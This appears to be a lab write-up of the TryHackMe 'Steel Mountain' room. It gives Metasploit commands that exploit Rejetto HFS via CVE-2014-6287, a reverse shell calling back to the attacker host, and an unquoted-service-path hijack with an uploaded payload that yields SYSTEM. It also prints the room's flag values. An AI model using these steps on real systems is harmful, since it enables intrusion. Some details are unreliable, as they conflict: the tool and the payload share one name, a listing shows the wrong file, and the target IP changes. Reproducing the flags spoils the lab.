# Steel Mountain — TryHackMe Writeup

**Platform:** TryHackMe  
**Target IP:** 10.48.158.93  
**OS:** Windows Server 2012 R2  
**Difficulty:** Easy  
**Date:** 2026-06-26  

---

## Overview

Steel Mountain is a Windows-based CTF room that covers exploitation of a vulnerable HTTP File Server (HFS 2.3) via CVE-2014-6287, followed by privilege escalation through an unquoted service path vulnerability in IObit Advanced SystemCare.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -A -Pn -p- -T4 10.48.158.93
```

**Key open ports:**

| Port  | Service             | Version / Notes                        |
|-------|---------------------|----------------------------------------|
| 80    | HTTP                | Microsoft IIS 8.5                      |
| 135   | MSRPC               | Windows RPC                            |
| 139   | NetBIOS             | Windows NetBIOS-SSN                    |
| 445   | SMB                 | Windows Server 2008 R2 – 2012          |
| 3389  | RDP                 | Microsoft Terminal Services            |
| 5985  | WinRM               | Microsoft HTTPAPI 2.0                  |
| **8080** | **HTTP**         | **HttpFileServer (HFS) 2.3** ← target  |
| 47001 | HTTP                | Microsoft HTTPAPI 2.0                  |

**Notable findings:**
- Machine hostname: `STEELMOUNTAIN`
- OS: Microsoft Windows Server 2012 R2 (kernel 6.3.9600)
- Port **8080** is running **Rejetto HFS 2.3**, which is vulnerable to **CVE-2014-6287** (Remote Command Execution via null-byte injection in the search function)
- SMB message signing is disabled — a potential lateral movement vector

**Web page (port 80)** revealed an "Employee of the Month" image. The image filename in the HTML source reveals the employee's name: **Bill Harper**.

---

## Initial Access — CVE-2014-6287 (Rejetto HFS RCE)

### Vulnerability

Rejetto HttpFileServer 2.3 is vulnerable to unauthenticated Remote Code Execution via a crafted HTTP request that injects a null byte (`%00`) into the search macro, bypassing the built-in filter and executing arbitrary HFS template commands.

**CVE:** CVE-2014-6287  
**CVSS:** 10.0 (Critical)  
**Metasploit Module:** `exploit/windows/http/rejetto_hfs_exec`

### Exploitation

```bash
msf > search 2014-6287
msf > use exploit/windows/http/rejetto_hfs_exec

msf exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.48.158.93
msf exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
msf exploit(windows/http/rejetto_hfs_exec) > set LHOST 192.168.171.216
msf exploit(windows/http/rejetto_hfs_exec) > run
```

**Result:**

```
[*] Meterpreter session 1 opened (192.168.171.216:4444 -> 10.48.158.93:49357)
```

A Meterpreter session was established as user `bill`.

### User Flag

```
meterpreter > cd C:\Users\bill\Desktop
meterpreter > cat user.txt
b04763b6fcf51fcd7c13abc7db4fd365
```

> **user.txt:** `b04763b6fcf51fcd7c13abc7db4fd365`

---

## Privilege Escalation — Unquoted Service Path (AdvancedSystemCareService9)

### Enumeration

After getting the initial shell, Windows privilege escalation enumeration (via **Advanced.exe** — a PowerUp-style tool) identified an unquoted service path vulnerability:

**Service:** `AdvancedSystemCareService9`  
**Binary Path:** `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`

Because the path contains spaces and is not quoted, Windows will attempt to resolve it in order:
1. `C:\Program.exe`
2. `C:\Program Files.exe`
3. `C:\Program Files (x86)\IObit\Advanced.exe`  ← **hijackable**
4. `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`

### Exploitation Steps

**1. Upload malicious payload:**

A reverse shell payload was compiled and named `Advanced.exe`, then uploaded via Meterpreter to the writable location `C:\Program Files (x86)\IObit\`:

```bash
meterpreter > upload /home/kali/Downloads/windowspriv/Advanced.exe
```

**2. Stop the vulnerable service:**

```cmd
sc stop AdvancedSystemCareService9
```

**3. Confirm payload is in place:**

```cmd
dir "C:\Program Files (x86)\IObit\Advanced Systemcare\ASCService.exe"
# Confirmed 12,288 byte file (our payload) present
```

**4. Set up listener on attacker machine:**

```bash
msf > use multi/handler
msf > set LHOST 192.168.171.216
msf > set LPORT 4443
msf > run
```

**5. Start the service to trigger execution:**

```cmd
sc start AdvancedSystemCareService9
```

**Result:** The service started our payload as **SYSTEM**, catching a reverse shell:

```
[*] Command shell session 2 opened (192.168.171.216:4443 -> 10.48.169.24:49304)
```

### Root Flag

```cmd
cd C:\Users\Administrator\Desktop
type root.txt
9af5f314f57607c00fd09803a587db80
```

> **root.txt:** `9af5f314f57607c00fd09803a587db80`

---

## Flags Summary

| Flag      | Hash                               |
|-----------|------------------------------------|
| user.txt  | `b04763b6fcf51fcd7c13abc7db4fd365` |
| root.txt  | `9af5f314f57607c00fd09803a587db80` |

---

## Lessons Learned

- **HFS 2.3 / CVE-2014-6287** is a well-known vulnerability — any legacy HTTP file server exposed on a network is a critical risk. Always patch or replace end-of-life software.
- **Unquoted service paths** are a classic Windows misconfiguration. Services with spaces in their binary path that lack quotes are hijackable by any user with write access to an intermediate directory.
- Setting the correct **LHOST** (attacker's reachable IP, not the default gateway) was essential for the reverse shell to connect — the first exploit attempt failed due to an incorrect LHOST.
- The `sc stop / sc start` pattern is a reliable way to trigger unquoted service path execution when you have `SERVICE_STOP` and `SERVICE_START` permissions.

---

## Tools Used

| Tool              | Purpose                                      |
|-------------------|----------------------------------------------|
| Nmap              | Port scanning & service enumeration          |
| Metasploit (msfconsole) | Exploit delivery (CVE-2014-6287)       |
| Meterpreter       | Post-exploitation shell & file operations    |
| PowerUp / Advanced.exe | Windows privilege escalation enumeration |
| sc.exe            | Service control for privesc trigger          |

---

*Writeup by Kshitiz Sadh*
